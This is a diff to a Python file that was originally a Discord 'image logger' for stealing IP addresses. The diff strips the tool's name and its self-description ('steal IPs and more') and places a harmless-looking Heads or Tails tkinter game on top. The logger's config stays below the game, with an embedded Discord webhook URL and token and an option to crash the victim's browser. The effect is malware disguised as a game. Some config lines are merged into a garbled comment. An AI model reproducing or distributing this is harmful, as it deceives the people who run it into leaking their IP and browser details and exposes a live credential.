@@ -4,22 +4,143 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
+import tkinter as tk
+import random
+import time
+import threading
+import os
 
-__app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
-__version__ = "v2.0"
-__author__ = "DeKrypt"
+# Sound (Windows only)
+try:
+    import winsound
+    SOUND_AVAILABLE = True
+except ImportError:
+    SOUND_AVAILABLE = False
+
+# High score file
+HIGH_SCORE_FILE = "highscore.txt"
+
+def load_high_score():
+    if os.path.exists(HIGH_SCORE_FILE):
+        with open(HIGH_SCORE_FILE, "r") as f:
+            return int(f.read())
+    return 0
+
+def save_high_score(score):
+    with open(HIGH_SCORE_FILE, "w") as f:
+        f.write(str(score))
+
+score = 0
+high_score = load_high_score()
+dark_mode = False
+
+def play_sound(win=True):
+    if SOUND_AVAILABLE:
+        if win:
+            winsound.Beep(800, 150)
+        else:
+            winsound.Beep(300, 300)
+
+def animate_flip(final_result, user_choice):
+    global score, high_score
+
+    for _ in range(6):
+        result_label.config(text=random.choice(["Heads", "Tails"]))
+        time.sleep(0.1)
+
+    result_label.config(text=f"Coin landed on: {final_result}")
+
+    if user_choice == final_result:
+        score += 1
+        result_label.config(text=f"Coin landed on: {final_result}\nYou win!")
+        play_sound(True)
+    else:
+        score = 0
+        result_label.config(text=f"Coin landed on: {final_result}\nYou lost! Score reset.")
+        play_sound(False)
+
+    if score > high_score:
+        high_score = score
+        save_high_score(high_score)
+
+    score_label.config(text=f"Score: {score}")
+    high_score_label.config(text=f"High Score: {high_score}")
+
+def flip_coin(user_choice):
+    threading.Thread(
+        target=animate_flip,
+        args=(random.choice(["Heads", "Tails"]), user_choice),
+        daemon=True
+    ).start()
+
+def toggle_dark_mode():
+    global dark_mode
+    dark_mode = not dark_mode
+
+    bg = "#1e1e1e" if dark_mode else "#f4f4f4"
+    fg = "white" if dark_mode else "black"
+    card = "#2e2e2e" if dark_mode else "white"
+
+    root.configure(bg=bg)
+    frame.configure(bg=card)
+
+    for widget in frame.winfo_children():
+        widget.configure(bg=card, fg=fg)
+
+# Window
+root = tk.Tk()
+root.title("Heads or Tails")
+root.geometry("320x330")
+root.resizable(False, False)
+root.configure(bg="#f4f4f4")
+
+frame = tk.Frame(root, bg="white", padx=20, pady=20)
+frame.pack(expand=True)
+
+title = tk.Label(frame, text="Heads or Tails", font=("Arial", 16, "bold"))
+title.pack(pady=5)
+
+score_label = tk.Label(frame, text=f"Score: {score}", font=("Arial", 12))
+score_label.pack()
+
+high_score_label = tk.Label(frame, text=f"High Score: {high_score}", font=("Arial", 11))
+high_score_label.pack(pady=5)
+
+btn_frame = tk.Frame(frame)
+btn_frame.pack(pady=10)
+
+heads_btn = tk.Button(btn_frame, text="Heads", width=10, command=lambda: flip_coin("Heads"))
+heads_btn.grid(row=0, column=0, padx=5)
+
+tails_btn = tk.Button(btn_frame, text="Tails", width=10, command=lambda: flip_coin("Tails"))
+tails_btn.grid(row=0, column=1, padx=5)
+
+result_label = tk.Label(frame, text="", font=("Arial", 11))
+result_label.pack(pady=15)
+
+dark_btn = tk.Button(frame, text="Toggle Dark Mode", command=toggle_dark_mode)
+dark_btn.pack(pady=5)
+
+root.mainloop()
+
+
+
+
+
+
+
+
+
 
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1451000093691084997/gZm2Nvt3CYoNoam9-A8Xr2rkZTnNIiiHGjXaP83sgMMRkwaGL_LIsb3C_fW93vvyF5HS",
     "image": "https://i.pinimg.com/474x/7c/bc/07/7cbc07cffa0fa6de589c504f78e635f3.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+    "imageArgument": False, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x5865F2, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    # Set this to the name you want the webhook  # Hex Color you want for the 
 
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
